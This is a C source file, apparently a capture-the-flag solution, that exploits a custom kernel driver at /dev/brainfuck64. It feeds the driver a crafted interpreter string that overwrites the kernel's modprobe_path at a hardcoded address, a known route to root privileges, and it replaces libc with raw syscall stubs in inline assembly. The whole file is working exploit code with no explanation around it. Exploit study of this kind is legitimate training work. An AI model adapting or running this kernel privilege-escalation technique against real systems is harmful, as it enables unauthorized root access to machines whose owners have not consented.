// gcc exploit.c -masm=intel -fno-PIE -nostdlib/-static -no-pie -o exploit
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>

size_t read(int fd, void *buf, size_t count);
size_t write(int fd, void *buf, size_t count);
int open(const char* pathname, int flags, ...);
int close(int fd);
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int mprotect(void *addr, size_t len, int prot);
int munmap(void *addr, size_t length);
int ioctl(int fd, unsigned long request, ...);
int execve(const char *filename, char *const argv[], char *const envp[]);
void exit(int status);

/* exploit */
unsigned long modprobe_path 	= 0xffffffff81a3f7a0;

struct info {
	unsigned long magic;
	unsigned long size;
};

#define BF_RUN		0xbaadc0d3
#define BF_READ		0xd00dc0d3
#define BF_WRITE	0xac1dc0d3

void _start(void){
	int fd;
	struct info info;
	char code[500] = "<<<<<<<<^AAAAAAAA^/home/us^er/a";
	unsigned long buf[0x20/sizeof(long)];

	if((fd = open("/dev/brainfuck64", O_RDWR)) < 0){
		exit(-1);
	}

	info.magic = 0x34364642;
	info.size = sizeof(buf);
	write(fd, &info, sizeof(info));

	read(fd, buf, sizeof(buf));

	*(unsigned long*)&code[9] = modprobe_path - 8;
	ioctl(fd, BF_RUN, code);

	read(fd, buf, sizeof(buf));
	close(fd);

	exit(0);
}

asm(
"read:\n"
"mov rax, 0\n"
"syscall\n"
"ret\n"

"write:\n"
"mov rax, 1\n"
"syscall\n"
"ret\n"

"open:\n"
"mov rax, 2\n"
"syscall\n"
"ret\n"

"close:\n"
"mov rax, 3\n"
"syscall\n"
"ret\n"

"mmap:\n"
"mov rax, 9\n"
"mov r10, rcx\n"
"syscall\n"
"ret\n"

"mprotect:\n"
"mov rax, 10\n"
"syscall\n"
"ret\n"

"munmap:\n"
"mov rax, 11\n"
"syscall\n"
"ret\n"

"ioctl:\n"
"mov rax, 16\n"
"syscall\n"
"ret\n"

"execve:\n"
"mov rax, 59\n"
"syscall\n"
"ret\n"

"exit:\n"
"mov rax, 60\n"
"syscall\n"
);
